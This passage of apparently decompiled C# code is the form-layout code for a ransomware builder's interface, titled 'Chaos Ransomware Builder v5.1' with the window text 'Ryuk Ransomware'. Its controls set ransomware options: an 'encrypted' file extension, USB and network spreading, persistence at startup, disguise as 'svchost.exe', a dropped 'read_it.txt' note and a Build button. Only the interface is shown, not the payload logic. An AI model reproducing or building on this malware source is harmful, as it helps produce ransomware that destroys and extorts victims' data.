		checkBox2 = new CheckBox();
		spreadNameText = new TextBox();
		checkBox1 = new CheckBox();
		textBox2 = new TextBox();
		usbSpreadCheckBox = new CheckBox();
		shapedButton4 = new ShapedButton();
		shapedButton3 = new ShapedButton();
		RightBottomPanel_2 = new Panel();
		LeftBottomPanel_2 = new Panel();
		RightTopPanel_1 = new Panel();
		RightTopPanel_2 = new Panel();
		textBox1 = new TextBox();
		saveFileDialog1 = new SaveFileDialog();
		openFileDialog1 = new OpenFileDialog();
		((Control)TopPanel).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)RightPanel).Anchor = (AnchorStyles)11;
		((Control)RightPanel).BackColor = Color.Black;
		((Control)RightPanel).Cursor = Cursors.SizeWE;
		((Control)RightPanel).Location = new Point(896, 22);
		((Control)RightPanel).Name = "RightPanel";
		((Control)RightPanel).Size = new Size(2, 468);
		((Control)RightPanel).TabIndex = 1;
		((Control)RightPanel).MouseDown += new MouseEventHandler(RightPanel_MouseDown);
		((Control)RightPanel).MouseMove += new MouseEventHandler(RightPanel_MouseMove);
		((Control)RightPanel).MouseUp += new MouseEventHandler(RightPanel_MouseUp);
		((Control)TopPanel).Anchor = (AnchorStyles)13;
		((Control)TopPanel).BackColor = Color.FromArgb(30, 30, 30);
		((Control)TopPanel).Controls.Add((Control)(object)_MinButton);
		((Control)TopPanel).Controls.Add((Control)(object)_MaxButton);
		((Control)TopPanel).Controls.Add((Control)(object)WindowTextLabel);
		((Control)TopPanel).Controls.Add((Control)(object)_CloseButton);
		((Control)TopPanel).Location = new Point(0, 0);
		((Control)TopPanel).Name = "TopPanel";
		((Control)TopPanel).Size = new Size(845, 74);
		((Control)TopPanel).TabIndex = 4;
		((Control)TopPanel).Paint += new PaintEventHandler(TopPanel_Paint);
		((Control)TopPanel).MouseDown += new MouseEventHandler(TopPanel_MouseDown);
		((Control)TopPanel).MouseMove += new MouseEventHandler(TopPanel_MouseMove);
		((Control)TopPanel).MouseUp += new MouseEventHandler(TopPanel_MouseUp);
		((Control)_MinButton).Anchor = (AnchorStyles)9;
		_MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MinButton.DisplayText = "_";
		((ButtonBase)_MinButton).FlatStyle = (FlatStyle)0;
		((Control)_MinButton).Font = new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_MinButton).ForeColor = Color.White;
		((Control)_MinButton).Location = new Point(737, 8);
		_MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MinButton).Name = "_MinButton";
		((Control)_MinButton).Size = new Size(31, 24);
		((Control)_MinButton).TabIndex = 4;
		((Control)_MinButton).Text = "_";
		_MinButton.TextLocation_X = 6;
		_MinButton.TextLocation_Y = -20;
		((ButtonBase)_MinButton).UseVisualStyleBackColor = true;
		((Control)_MinButton).Click += _MinButton_Click;
		((Control)_MaxButton).Anchor = (AnchorStyles)9;
		_MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
		_MaxButton.DisplayText = "_";
		((ButtonBase)_MaxButton).FlatStyle = (FlatStyle)0;
		((Control)_MaxButton).ForeColor = Color.White;
		((Control)_MaxButton).Location = new Point(774, 9);
		_MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MaxButton).Name = "_MaxButton";
		((Control)_MaxButton).Size = new Size(31, 24);
		((Control)_MaxButton).TabIndex = 2;
		((Control)_MaxButton).Text = "minMaxButton1";
		_MaxButton.TextLocation_X = 8;
		_MaxButton.TextLocation_Y = 6;
		((ButtonBase)_MaxButton).UseVisualStyleBackColor = true;
		((Control)_MaxButton).Click += _MaxButton_Click;
		((Control)WindowTextLabel).AutoSize = true;
		((Control)WindowTextLabel).Font = new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)WindowTextLabel).ForeColor = Color.White;
		((Control)WindowTextLabel).Location = new Point(8, 22);
		((Control)WindowTextLabel).Name = "WindowTextLabel";
		((Control)WindowTextLabel).Size = new Size(523, 39);
		((Control)WindowTextLabel).TabIndex = 1;
		((Control)WindowTextLabel).Text = "Chaos Ransomware Builder v5.1";
		((Control)WindowTextLabel).MouseDown += new MouseEventHandler(WindowTextLabel_MouseDown);
		((Control)WindowTextLabel).MouseMove += new MouseEventHandler(WindowTextLabel_MouseMove);
		((Control)WindowTextLabel).MouseUp += new MouseEventHandler(WindowTextLabel_MouseUp);
		((Control)_CloseButton).Anchor = (AnchorStyles)9;
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).FlatStyle = (FlatStyle)0;
		((Control)_CloseButton).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_CloseButton).ForeColor = Color.White;
		((Control)_CloseButton).Location = new Point(811, 8);
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).Name = "_CloseButton";
		((Control)_CloseButton).Size = new Size(31, 24);
		((Control)_CloseButton).TabIndex = 0;
		((Control)_CloseButton).Text = "X";
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).UseVisualStyleBackColor = true;
		((Control)_CloseButton).Click += _CloseButton_Click;
		((Control)RightBottomPanel_1).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_1).BackColor = Color.Black;
		((Control)RightBottomPanel_1).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_1).Location = new Point(878, 509);
		((Control)RightBottomPanel_1).Name = "RightBottomPanel_1";
		((Control)RightBottomPanel_1).Size = new Size(19, 2);
		((Control)RightBottomPanel_1).TabIndex = 5;
		((Control)RightBottomPanel_1).MouseDown += new MouseEventHandler(RightBottomPanel_1_MouseDown);
		((Control)RightBottomPanel_1).MouseMove += new MouseEventHandler(RightBottomPanel_1_MouseMove);
		((Control)RightBottomPanel_1).MouseUp += new MouseEventHandler(RightBottomPanel_1_MouseUp);
		((Control)panel2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)panel2).Controls.Add((Control)(object)shapedButton2);
		((Control)panel2).Controls.Add((Control)(object)label1);
		((Control)panel2).Controls.Add((Control)(object)droppedMessageTextbox);
		((Control)panel2).Controls.Add((Control)(object)shapedButton1);
		((Control)panel2).Controls.Add((Control)(object)sleepCheckBox);
		((Control)panel2).Controls.Add((Control)(object)SleepTextBox);
		((Control)panel2).Controls.Add((Control)(object)selectIconLabel);
		((Control)panel2).Controls.Add((Control)(object)pictureBox1);
		((Control)panel2).Controls.Add((Control)(object)startupcheckBox3);
		((Control)panel2).Controls.Add((Control)(object)textBox4);
		((Control)panel2).Controls.Add((Control)(object)checkBox2);
		((Control)panel2).Controls.Add((Control)(object)spreadNameText);
		((Control)panel2).Controls.Add((Control)(object)checkBox1);
		((Control)panel2).Controls.Add((Control)(object)textBox2);
		((Control)panel2).Controls.Add((Control)(object)usbSpreadCheckBox);
		((Control)panel2).Controls.Add((Control)(object)shapedButton4);
		((Control)panel2).Controls.Add((Control)(object)shapedButton3);
		((Control)panel2).Dock = (DockStyle)2;
		((Control)panel2).ForeColor = SystemColors.Control;
		((Control)panel2).Location = new Point(0, 398);
		((Control)panel2).Name = "panel2";
		((Control)panel2).Size = new Size(847, 146);
		((Control)panel2).TabIndex = 8;
		((Control)panel2).Paint += new PaintEventHandler(panel2_Paint);
		((Control)shapedButton2).Anchor = (AnchorStyles)9;
		((Control)shapedButton2).BackColor = Color.Transparent;
		shapedButton2.BorderColor = Color.Transparent;
		shapedButton2.BorderWidth = 2;
		shapedButton2.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton2.ButtonText = "FileExtensions";
		((Control)shapedButton2).Cursor = Cursors.Hand;
		shapedButton2.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton2).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton2).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton2).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton2).FlatStyle = (FlatStyle)0;
		((Control)shapedButton2).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton2).ForeColor = Color.White;
		shapedButton2.GradientAngle = 90;
		((Control)shapedButton2).Location = new Point(0, 82);
		shapedButton2.MouseClickColor1 = Color.Black;
		shapedButton2.MouseClickColor2 = Color.Black;
		shapedButton2.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton2.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton2).Name = "shapedButton2";
		shapedButton2.ShowButtontext = true;
		((Control)shapedButton2).Size = new Size(166, 55);
		shapedButton2.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton2).TabIndex = 27;
		shapedButton2.TextLocation_X = 30;
		shapedButton2.TextLocation_Y = 19;
		shapedButton2.Transparent1 = 250;
		shapedButton2.Transparent2 = 250;
		((ButtonBase)shapedButton2).UseVisualStyleBackColor = false;
		((Control)shapedButton2).Click += shapedButton2_Click;
		((Control)label1).Anchor = (AnchorStyles)9;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label1).Location = new Point(522, 17);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(115, 15);
		((Control)label1).TabIndex = 26;
		((Control)label1).Text = "Dropped File Name";
		((Control)droppedMessageTextbox).Anchor = (AnchorStyles)9;
		((Control)droppedMessageTextbox).BackColor = Color.FromArgb(30, 30, 30);
		((Control)droppedMessageTextbox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)droppedMessageTextbox).ForeColor = SystemColors.Window;
		((Control)droppedMessageTextbox).Location = new Point(525, 40);
		((Control)droppedMessageTextbox).Name = "droppedMessageTextbox";
		((Control)droppedMessageTextbox).Size = new Size(143, 22);
		((Control)droppedMessageTextbox).TabIndex = 25;
		((Control)droppedMessageTextbox).Text = "read_it.txt";
		droppedMessageTextbox.TextAlign = (HorizontalAlignment)2;
		((Control)shapedButton1).BackColor = Color.Transparent;
		shapedButton1.BorderColor = Color.Transparent;
		shapedButton1.BorderWidth = 2;
		shapedButton1.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton1.ButtonText = "Advanced Options";
		((Control)shapedButton1).Cursor = Cursors.Hand;
		shapedButton1.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton1).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton1).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton1).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton1).FlatStyle = (FlatStyle)0;
		((Control)shapedButton1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton1).ForeColor = Color.White;
		shapedButton1.GradientAngle = 80;
		((Control)shapedButton1).Location = new Point(175, 82);
		shapedButton1.MouseClickColor1 = Color.Black;
		shapedButton1.MouseClickColor2 = Color.Black;
		shapedButton1.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton1.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton1).Name = "shapedButton1";
		shapedButton1.ShowButtontext = true;
		((Control)shapedButton1).Size = new Size(166, 55);
		shapedButton1.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton1).TabIndex = 23;
		shapedButton1.TextLocation_X = 16;
		shapedButton1.TextLocation_Y = 20;
		shapedButton1.Transparent1 = 200;
		shapedButton1.Transparent2 = 200;
		((ButtonBase)shapedButton1).UseVisualStyleBackColor = false;
		((Control)shapedButton1).Click += shapedButton1_Click;
		((Control)sleepCheckBox).Anchor = (AnchorStyles)9;
		((Control)sleepCheckBox).AutoSize = true;
		((Control)sleepCheckBox).Cursor = Cursors.Hand;
		((Control)sleepCheckBox).Location = new Point(359, 81);
		((Control)sleepCheckBox).Name = "sleepCheckBox";
		((Control)sleepCheckBox).Size = new Size(91, 17);
		((Control)sleepCheckBox).TabIndex = 22;
		((Control)sleepCheckBox).Text = "Delay second";
		((ButtonBase)sleepCheckBox).UseVisualStyleBackColor = true;
		sleepCheckBox.CheckedChanged += checkBox3_CheckedChanged;
		((Control)SleepTextBox).Anchor = (AnchorStyles)9;
		((Control)SleepTextBox).BackColor = Color.FromArgb(30, 30, 30);
		((Control)SleepTextBox).Enabled = false;
		((Control)SleepTextBox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)SleepTextBox).ForeColor = SystemColors.Window;
		((Control)SleepTextBox).Location = new Point(359, 107);
		((Control)SleepTextBox).Name = "SleepTextBox";
		((Control)SleepTextBox).Size = new Size(91, 22);
		((Control)SleepTextBox).TabIndex = 21;
		((Control)SleepTextBox).Text = "10";
		SleepTextBox.TextAlign = (HorizontalAlignment)2;
		((Control)SleepTextBox).KeyPress += new KeyPressEventHandler(SleepTextBox_KeyPress_1);
		((Control)selectIconLabel).Anchor = (AnchorStyles)9;
		((Control)selectIconLabel).AutoSize = true;
		((Control)selectIconLabel).Cursor = Cursors.Hand;
		((Control)selectIconLabel).Location = new Point(593, 93);
		((Control)selectIconLabel).Name = "selectIconLabel";
		((Control)selectIconLabel).Size = new Size(61, 13);
		((Control)selectIconLabel).TabIndex = 20;
		((Control)selectIconLabel).Text = "Select Icon";
		((Control)selectIconLabel).Click += selectIconLabel_Click;
		((Control)pictureBox1).Anchor = (AnchorStyles)9;
		pictureBox1.BorderStyle = (BorderStyle)1;
		((Control)pictureBox1).Cursor = Cursors.Hand;
		((Control)pictureBox1).Location = new Point(579, 68);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(89, 69);
		pictureBox1.SizeMode = (PictureBoxSizeMode)3;
		pictureBox1.TabIndex = 18;
		pictureBox1.TabStop = false;
		((Control)pictureBox1).Click += pictureBox1_Click;
		((Control)startupcheckBox3).AutoSize = true;
		startupcheckBox3.Checked = true;
		startupcheckBox3.CheckState = (CheckState)1;
		((Control)startupcheckBox3).Cursor = Cursors.Hand;
		((Control)startupcheckBox3).Location = new Point(470, 82);
		((Control)startupcheckBox3).Name = "startupcheckBox3";
		((Control)startupcheckBox3).Size = new Size(92, 17);
		((Control)startupcheckBox3).TabIndex = 15;
		((Control)startupcheckBox3).Text = "Add to startup";
		((ButtonBase)startupcheckBox3).UseVisualStyleBackColor = true;
		((Control)textBox4).Anchor = (AnchorStyles)9;
		((Control)textBox4).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox4).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox4).ForeColor = SystemColors.Window;
		((Control)textBox4).Location = new Point(359, 40);
		((Control)textBox4).Name = "textBox4";
		((Control)textBox4).Size = new Size(143, 22);
		((Control)textBox4).TabIndex = 14;
		((Control)textBox4).Text = "svchost.exe";
		textBox4.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox2).Anchor = (AnchorStyles)9;
		((Control)checkBox2).AutoSize = true;
		checkBox2.Checked = true;
		checkBox2.CheckState = (CheckState)1;
		((Control)checkBox2).Cursor = Cursors.Hand;
		((Control)checkBox2).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)checkBox2).Location = new Point(359, 17);
		((Control)checkBox2).Name = "checkBox2";
		((Control)checkBox2).Size = new Size(104, 17);
		((Control)checkBox2).TabIndex = 13;
		((Control)checkBox2).Text = "Proccess Name:";
		((ButtonBase)checkBox2).UseVisualStyleBackColor = true;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged;
		((Control)spreadNameText).BackColor = Color.FromArgb(30, 30, 30);
		((Control)spreadNameText).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)spreadNameText).ForeColor = SystemColors.Window;
		((Control)spreadNameText).Location = new Point(190, 40);
		((Control)spreadNameText).Name = "spreadNameText";
		((Control)spreadNameText).Size = new Size(143, 22);
		((Control)spreadNameText).TabIndex = 12;
		((Control)spreadNameText).Text = "surprise";
		spreadNameText.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox1).AutoSize = true;
		checkBox1.Checked = true;
		checkBox1.CheckState = (CheckState)1;
		((Control)checkBox1).Cursor = Cursors.Hand;
		((Control)checkBox1).Location = new Point(20, 14);
		((Control)checkBox1).Name = "checkBox1";
		((Control)checkBox1).Size = new Size(146, 17);
		((Control)checkBox1).TabIndex = 11;
		((Control)checkBox1).Text = "Randomize file extension:";
		((ButtonBase)checkBox1).UseVisualStyleBackColor = true;
		checkBox1.CheckedChanged += checkBox1_CheckedChanged;
		((Control)textBox2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox2).Enabled = false;
		((Control)textBox2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox2).ForeColor = SystemColors.Window;
		((Control)textBox2).Location = new Point(20, 40);
		((Control)textBox2).Name = "textBox2";
		((Control)textBox2).Size = new Size(143, 22);
		((Control)textBox2).TabIndex = 10;
		((Control)textBox2).Text = "encrypted";
		textBox2.TextAlign = (HorizontalAlignment)2;
		((Control)usbSpreadCheckBox).AutoSize = true;
		usbSpreadCheckBox.Checked = true;
		usbSpreadCheckBox.CheckState = (CheckState)1;
		((Control)usbSpreadCheckBox).Cursor = Cursors.Hand;
		((Control)usbSpreadCheckBox).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)usbSpreadCheckBox).Location = new Point(193, 14);
		((Control)usbSpreadCheckBox).Name = "usbSpreadCheckBox";
		((Control)usbSpreadCheckBox).Size = new Size(145, 17);
		((Control)usbSpreadCheckBox).TabIndex = 9;
		((Control)usbSpreadCheckBox).Text = "Usb and network spread:";
		((ButtonBase)usbSpreadCheckBox).UseVisualStyleBackColor = true;
		usbSpreadCheckBox.CheckedChanged += usbSpreadCheckBox_CheckedChanged;
		((Control)shapedButton4).Anchor = (AnchorStyles)9;
		((Control)shapedButton4).BackColor = Color.Transparent;
		shapedButton4.BorderColor = Color.Transparent;
		shapedButton4.BorderWidth = 2;
		shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton4.ButtonText = "Build ";
		((Control)shapedButton4).Cursor = Cursors.Hand;
		shapedButton4.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton4).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton4).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton4).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton4).FlatStyle = (FlatStyle)0;
		((Control)shapedButton4).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton4).ForeColor = Color.White;
		shapedButton4.GradientAngle = 90;
		((Control)shapedButton4).Location = new Point(699, 79);
		shapedButton4.MouseClickColor1 = Color.Black;
		shapedButton4.MouseClickColor2 = Color.Black;
		shapedButton4.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton4.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton4).Name = "shapedButton4";
		shapedButton4.ShowButtontext = true;
		((Control)shapedButton4).Size = new Size(136, 55);
		shapedButton4.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton4).TabIndex = 8;
		shapedButton4.TextLocation_X = 46;
		shapedButton4.TextLocation_Y = 18;
		shapedButton4.Transparent1 = 250;
		shapedButton4.Transparent2 = 250;
		((ButtonBase)shapedButton4).UseVisualStyleBackColor = false;
		((Control)shapedButton4).Click += shapedButton4_Click;
		((Control)shapedButton3).Anchor = (AnchorStyles)9;
		((Control)shapedButton3).BackColor = Color.Transparent;
		shapedButton3.BorderColor = Color.Transparent;
		shapedButton3.BorderWidth = 2;
		shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton3.ButtonText = "About";
		((Control)shapedButton3).Cursor = Cursors.Hand;
		shapedButton3.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton3).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton3).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton3).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton3).FlatStyle = (FlatStyle)0;
		((Control)shapedButton3).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton3).ForeColor = Color.White;
		shapedButton3.GradientAngle = 90;
		((Control)shapedButton3).Location = new Point(699, 18);
		shapedButton3.MouseClickColor1 = Color.Black;
		shapedButton3.MouseClickColor2 = Color.Black;
		shapedButton3.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton3.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton3).Name = "shapedButton3";
		shapedButton3.ShowButtontext = true;
		((Control)shapedButton3).Size = new Size(136, 55);
		shapedButton3.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton3).TabIndex = 7;
		shapedButton3.TextLocation_X = 45;
		shapedButton3.TextLocation_Y = 18;
		shapedButton3.Transparent1 = 250;
		shapedButton3.Transparent2 = 250;
		((ButtonBase)shapedButton3).UseVisualStyleBackColor = false;
		((Control)shapedButton3).Click += shapedButton3_Click;
		((Control)RightBottomPanel_2).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_2).BackColor = Color.Black;
		((Control)RightBottomPanel_2).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_2).Location = new Point(896, 490);
		((Control)RightBottomPanel_2).Name = "RightBottomPanel_2";
		((Control)RightBottomPanel_2).Size = new Size(2, 19);
		((Control)RightBottomPanel_2).TabIndex = 9;
		((Control)RightBottomPanel_2).MouseDown += new MouseEventHandler(RightBottomPanel_2_MouseDown);
		((Control)RightBottomPanel_2).MouseMove += new MouseEventHandler(RightBottomPanel_2_MouseMove);
		((Control)RightBottomPanel_2).MouseUp += new MouseEventHandler(RightBottomPanel_2_MouseUp);
		((Control)LeftBottomPanel_2).Anchor = (AnchorStyles)6;
		((Control)LeftBottomPanel_2).BackColor = Color.Black;
		((Control)LeftBottomPanel_2).Cursor = Cursors.SizeNESW;
		((Control)LeftBottomPanel_2).Location = new Point(0, 491);
		((Control)LeftBottomPanel_2).Name = "LeftBottomPanel_2";
		((Control)LeftBottomPanel_2).Size = new Size(2, 19);
		((Control)LeftBottomPanel_2).TabIndex = 11;
		((Control)LeftBottomPanel_2).MouseDown += new MouseEventHandler(LeftBottomPanel_2_MouseDown);
		((Control)LeftBottomPanel_2).MouseMove += new MouseEventHandler(LeftBottomPanel_2_MouseMove);
		((Control)LeftBottomPanel_2).MouseUp += new MouseEventHandler(LeftBottomPanel_2_MouseUp);
		((Control)RightTopPanel_1).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_1).BackColor = Color.Black;
		((Control)RightTopPanel_1).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_1).Location = new Point(896, 2);
		((Control)RightTopPanel_1).Name = "RightTopPanel_1";
		((Control)RightTopPanel_1).Size = new Size(2, 20);
		((Control)RightTopPanel_1).TabIndex = 12;
		((Control)RightTopPanel_1).MouseDown += new MouseEventHandler(RightTopPanel_1_MouseDown);
		((Control)RightTopPanel_1).MouseMove += new MouseEventHandler(RightTopPanel_1_MouseMove);
		((Control)RightTopPanel_1).MouseUp += new MouseEventHandler(RightTopPanel_1_MouseUp);
		((Control)RightTopPanel_2).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_2).BackColor = Color.Black;
		((Control)RightTopPanel_2).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_2).Location = new Point(878, 0);
		((Control)RightTopPanel_2).Name = "RightTopPanel_2";
		((Control)RightTopPanel_2).Size = new Size(20, 2);
		((Control)RightTopPanel_2).TabIndex = 13;
		((Control)RightTopPanel_2).MouseDown += new MouseEventHandler(RightTopPanel_2_MouseDown);
		((Control)RightTopPanel_2).MouseMove += new MouseEventHandler(RightTopPanel_2_MouseMove);
		((Control)RightTopPanel_2).MouseUp += new MouseEventHandler(RightTopPanel_2_MouseUp);
		((Control)textBox1).Anchor = (AnchorStyles)15;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((TextBoxBase)textBox1).BorderStyle = (BorderStyle)0;
		((Control)textBox1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)textBox1).ForeColor = SystemColors.Window;
		((Control)textBox1).Location = new Point(12, 80);
		((TextBoxBase)textBox1).Multiline = true;
		((Control)textBox1).Name = "textBox1";
		textBox1.ScrollBars = (ScrollBars)2;
		((Control)textBox1).Size = new Size(833, 312);
		((Control)textBox1).TabIndex = 18;
		((Control)textBox1).Text = componentResourceManager.GetString("textBox1.Text");
		((TextBoxBase)textBox1).MouseClick += new MouseEventHandler(textBox1_MouseClick);
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((FileDialog)saveFileDialog1).FileOk += saveFileDialog1_FileOk;
		((FileDialog)openFileDialog1).FileName = "openFileDialog1";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((ScrollableControl)this).AutoScroll = true;
		((Control)this).BackColor = Color.FromArgb(30, 30, 30);
		((Form)this).ClientSize = new Size(847, 544);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_2);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_1);
		((Control)this).Controls.Add((Control)(object)LeftBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_1);
		((Control)this).Controls.Add((Control)(object)RightPanel);
		((Control)this).Controls.Add((Control)(object)TopPanel);
		((Control)this).Controls.Add((Control)(object)panel2);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Control)this).MinimumSize = new Size(847, 544);
		((Control)this).Name = "BlackForm";
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "Ryuk Ransomware";
		((Form)this).Load += BlackForm_Load;
		((Control)TopPanel).ResumeLayout(false);
		((Control)TopPanel).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
